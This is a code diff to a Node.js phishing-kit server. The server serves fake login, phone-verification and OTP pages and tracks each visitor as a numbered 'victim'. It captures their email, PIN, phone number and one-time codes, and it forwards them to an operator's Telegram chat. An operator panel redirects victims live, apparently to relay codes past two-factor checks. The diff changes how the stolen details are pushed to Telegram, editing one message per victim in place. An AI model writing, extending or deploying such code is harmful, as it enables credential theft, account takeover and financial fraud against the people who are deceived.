@@ -5,7 +5,6 @@ const path    = require('path');
 const TelegramBot = require('node-telegram-bot-api');
 
 // ===== TELEGRAM CONFIGURATION =====
-// These will be set via environment variables on Railway
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 // ==================================
@@ -19,7 +18,9 @@ const PORT = process.env.PORT || 3000;
 
 console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', TELEGRAM_CONFIGURED: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) });
 
-// Initialize Telegram Bot if token is provided
+// Store message IDs per session for updating
+const sessionMessageIds = new Map();
+
 let bot = null;
 if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '') {
   bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
@@ -29,17 +30,16 @@ if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '') {
 const events = new (require('events')).EventEmitter();
 function emitPanelUpdate() { events.emit('panel'); }
 
-// Telegram message queue to avoid rate limiting
 let messageQueue = [];
 let isSending = false;
 
-async function sendTelegramMessage(message, eventType = '') {
+async function sendTelegramMessage(message, sessionId = null, isNew = true) {
   if (!bot || !TELEGRAM_CHAT_ID) {
     console.log('[TELEGRAM] Bot not configured, skipping message');
     return;
   }
   
-  messageQueue.push({ message, eventType });
+  messageQueue.push({ message, sessionId, isNew });
   processTelegramQueue();
 }
 
@@ -47,16 +47,30 @@ async function processTelegramQueue() {
   if (isSending || messageQueue.length === 0) return;
   isSending = true;
   
-  const { message } = messageQueue.shift();
+  const { message, sessionId, isNew } = messageQueue.shift();
   
   try {
-    await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
-      parse_mode: 'HTML',
-      disable_web_page_preview: true
-    });
-    console.log(`[TELEGRAM] Message sent successfully`);
+    if (!isNew && sessionId && sessionMessageIds.has(sessionId)) {
+      const messageId = sessionMessageIds.get(sessionId);
+      await bot.editMessageText(message, {
+        chat_id: TELEGRAM_CHAT_ID,
+        message_id: messageId,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      });
+      console.log(`[TELEGRAM] Message updated for session ${sessionId}`);
+    } else {
+      const sentMessage = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      });
+      if (sessionId) {
+        sessionMessageIds.set(sessionId, sentMessage.message_id);
+        console.log(`[TELEGRAM] New message sent for session ${sessionId}`);
+      }
+    }
   } catch (error) {
-    console.error('[TELEGRAM] Failed to send message:', error.message);
+    console.error('[TELEGRAM] Failed to send/update message:', error.message);
   }
   
   isSending = false;
@@ -68,7 +82,6 @@ function formatPanelLoginMessage(req, username, success) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const ua = req.headers['user-agent'] || 'n/a';
   
-  // Parse user agent
   let platform = 'Unknown';
   let browser = 'Unknown';
   
@@ -85,76 +98,58 @@ function formatPanelLoginMessage(req, username, success) {
   
   const domain = req.headers.host || 'localhost';
   
-  let message = '';
-  
-  if (success) {
-    message = `🟢 <b>PANEL LOGIN SUCCESS</b>\n`;
-  } else {
-    message = `🔴 <b>PANEL LOGIN FAILED</b>\n`;
-  }
-  
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `👤 <b>User:</b> ${username}\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
-  message += `🖥️ <b>Platform:</b> ${platform}\n`;
-  message += `🌍 <b>Browser:</b> ${browser}\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🔗 <b>Domain:</b> ${domain}\n`;
-  message += `🕐 <b>Time:</b> ${timestamp}\n`;
+  let message = `🆕 LOGIN\n`;
+  message += `<b>user:</b> ${username}\n`;
+  message += `<b>IP:</b> <code>${ip}</code>\n`;
+  message += `<b>platform:</b> ${platform}\n`;
+  message += `<b>browser:</b> ${browser}\n`;
+  message += `<b>time:</b> ${timestamp}\n`;
+  message += `<b>domain:</b> ${domain}\n`;
   
   return message;
 }
 
 function formatSessionMessage(v, eventType) {
-  const timestamp = new Date().toLocaleString();
-  let message = '';
+  let statusText = '';
   
   switch(eventType) {
     case 'new':
-      message = `🆕 <b>NEW SESSION</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'credentials':
-      message = `🔐 <b>CREDENTIALS ENTERED</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'phone':
-      message = `📱 <b>PHONE ENTERED</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'unregister':
-      message = `🚫 <b>UNREGISTER CLICKED</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'otp':
-      message = `🔑 <b>OTP ENTERED</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'approved':
-      message = `✅ <b>SESSION APPROVED</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'redirect':
-      message = `🔄 <b>REDIRECT SENT</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     case 'reset':
-      message = `⚠️ <b>SESSION RESET</b>\n`;
+      statusText = '🆕 SESSION';
       break;
     default:
-      message = `📝 <b>SESSION UPDATE</b>\n`;
+      statusText = '🆕 SESSION';
   }
   
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🎯 <b>Victim #${v.victimNum}</b>\n`;
-  message += `🆔 <b>Session ID:</b> <code>${v.sid.substring(0, 8)}...</code>\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  
-  if (v.email) message += `👤 <b>Client:</b> <code>${v.email}</code>\n`;
-  if (v.password) message += `🔒 <b>Pin:</b> <code>${v.password}</code>\n`;
-  if (v.phone) message += `📞 <b>Phone:</b> <code>${v.phone}</code>\n`;
-  if (v.otp) message += `🔢 <b>OTP:</b> <code>${v.otp}</code>\n`;
-  
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🌐 <b>IP:</b> <code>${v.ip}</code>\n`;
-  message += `🖥️ <b>Platform:</b> ${v.platform}\n`;
-  message += `🌍 <b>Browser:</b> ${v.browser}\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🕐 <b>Time:</b> ${timestamp}\n`;
+  let message = `${statusText}\n`;
+  if (v.email) message += `<b>client:</b> <code>${v.email}</code>\n`;
+  if (v.password) message += `<b>pin:</b> <code>${v.password}</code>\n`;
+  if (v.phone) message += `<b>phone:</b> <code>${v.phone}</code>\n`;
+  if (v.otp) message += `<b>otp:</b> <code>${v.otp}</code>\n`;
+  message += `<b>IP:</b> <code>${v.ip}</code>\n`;
+  message += `<b>platform:</b> ${v.platform}\n`;
+  message += `<b>browser:</b> ${v.browser}\n`;
+  message += `<b>status:</b> ${eventType.toUpperCase()}\n`;
   
   return message;
 }
@@ -261,17 +256,14 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-// Serve static files
 app.use(express.static(__dirname));
 
-// HTML Routes
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/verify.html', (req, res) => res.sendFile(path.join(__dirname, 'verify.html')));
 app.get('/unregister.html', (req, res) => res.sendFile(path.join(__dirname, 'unregister.html')));
 app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
 app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));
 
-// Panel Routes
 app.get('/panel', (req, res) => {
   if (req.session?.authed === true) {
     req.session.save();
@@ -292,7 +284,6 @@ app.post('/panel/login', (req, res) => {
     req.session.save();
     console.log(`[DEBUG] Login success - session saved`);
     
-    // Send Telegram notification for successful panel login
     const message = formatPanelLoginMessage(req, user, true);
     sendTelegramMessage(message);
     
@@ -301,7 +292,6 @@ app.post('/panel/login', (req, res) => {
   
   console.log(`[DEBUG] Login failed`);
   
-  // Send Telegram notification for failed panel login attempt
   const message = formatPanelLoginMessage(req, user, false);
   sendTelegramMessage(message);
   
@@ -313,7 +303,6 @@ app.post('/panel/logout', (req, res) => {
   res.redirect(303, '/panel'); 
 });
 
-// Handle any other panel routes by redirecting to /panel
 app.use('/panel', (req, res, next) => {
   if (req.method === 'GET' && req.path !== '/' && req.path !== '') {
     res.redirect(302, '/panel');
@@ -335,15 +324,17 @@ app.use((req, res, next) => {
 function uaParser(ua) {
   const u = { browser: {}, os: {} };
   if (/Windows NT/.test(ua)) u.os.name = 'Windows';
-  if (/Android/.test(ua)) u.os.name = 'Android';
-  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
-  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
-  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
-  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
-  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
-  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
-  if (!u.os.name) u.os.name = 'Unknown';
-  if (!u.browser.name) u.browser.name = 'Unknown';
+  else if (/Android/.test(ua)) u.os.name = 'Android';
+  else if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
+  else if (/Linux/.test(ua)) u.os.name = 'Linux';
+  else if (/Mac/.test(ua)) u.os.name = 'macOS';
+  else u.os.name = 'Unknown';
+  
+  if (/Chrome\/(\d+)/.test(ua) && !/Edg/.test(ua)) u.browser.name = 'Chrome';
+  else if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
+  else if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
+  else if (/Edg/.test(ua)) u.browser.name = 'Edge';
+  else u.browser.name = 'Unknown';
   return u;
 }
 
@@ -368,6 +359,7 @@ function cleanupSession(sid, reason, silent = false) {
   if (!v) return;
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
+  sessionMessageIds.delete(sid);
 }
 
 app.post('/api/session', async (req, res) => {
@@ -394,9 +386,8 @@ app.post('/api/session', async (req, res) => {
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
     
-    // Send Telegram notification for new session
     const message = formatSessionMessage(victim, 'new');
-    sendTelegramMessage(message);
+    sendTelegramMessage(message, sid, true);
     
     res.json({ sid });
   } catch (err) {
@@ -430,10 +421,9 @@ app.post('/api/login', async (req, res) => {
 
     auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', otp: '', ip: v.ip, ua: v.ua });
     
-    // Send Telegram notification for credentials (only if not already entered)
     if (!wasEntered) {
       const message = formatSessionMessage(v, 'credentials');
-      sendTelegramMessage(message);
+      sendTelegramMessage(message, sid, false);
     }
     
     res.sendStatus(200);
@@ -459,10 +449,9 @@ app.post('/api/verify', async (req, res) => {
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
     
-    // Send Telegram notification for phone
     if (!wasPhoneEntered) {
       const message = formatSessionMessage(v, 'phone');
-      sendTelegramMessage(message);
+      sendTelegramMessage(message, sid, false);
     }
     
     res.sendStatus(200);
@@ -483,9 +472,8 @@ app.post('/api/unregister', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
     
-    // Send Telegram notification for unregister click
     const message = formatSessionMessage(v, 'unregister');
-    sendTelegramMessage(message);
+    sendTelegramMessage(message, sid, false);
     
     res.sendStatus(200);
   } catch (err) {
@@ -510,10 +498,9 @@ app.post('/api/otp', async (req, res) => {
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
     
-    // Send Telegram notification for OTP
     if (!wasOtpEntered) {
       const message = formatSessionMessage(v, 'otp');
-      sendTelegramMessage(message);
+      sendTelegramMessage(message, sid, false);
     }
     
     res.sendStatus(200);
@@ -658,7 +645,6 @@ app.post('/api/panel', async (req, res) => {
 
   switch (action) {
     case 'redo':
-      // Store old values before reset for comparison
       const hadEmail = v.email;
       const hadPassword = v.password;
       const hadPhone = v.phone;
@@ -678,10 +664,9 @@ app.post('/api/panel', async (req, res) => {
         v.redirectPending = null;
       }
       
-      // Send Telegram notification for reset (if any data was cleared)
       if ((hadEmail && !v.email) || (hadPassword && !v.password) || (hadPhone && !v.phone) || (hadOtp && !v.otp)) {
         const message = formatSessionMessage(v, 'reset');
-        sendTelegramMessage(message);
+        sendTelegramMessage(message, sid, false);
       }
       break;
     case 'delete':
@@ -717,9 +702,8 @@ app.post('/api/redirect', async (req, res) => {
     v.page = 'success';
     successfulLogins++;
     
-    // Send Telegram notification for approval
     const message = formatSessionMessage(v, 'approved');
-    sendTelegramMessage(message);
+    sendTelegramMessage(message, sid, false);
   } else {
     redirectPage = `/verify.html?sid=${sid}`;
     v.page = 'verify.html';
@@ -731,9 +715,8 @@ app.post('/api/redirect', async (req, res) => {
   v.activityLog = v.activityLog || [];
   v.activityLog.push({ time: Date.now(), action: 'ADMIN REDIRECT', detail: `Redirected to ${target} → ${redirectPage}` });
   
-  // Send Telegram notification for redirect
   const message = formatSessionMessage(v, 'redirect');
-  sendTelegramMessage(message);
+  sendTelegramMessage(message, sid, false);
   
   console.log(`[DEBUG] Set pending redirect for session ${sid} to: ${redirectPage}`);
   
@@ -748,6 +731,7 @@ app.post('/api/refresh', (req, res) => {
   auditLog.length = 0;
   victimCounter = 0;
   successfulLogins = 0;
+  sessionMessageIds.clear();
   
   console.log('[DEBUG] Session refreshed by admin');
   res.json({ ok: true });
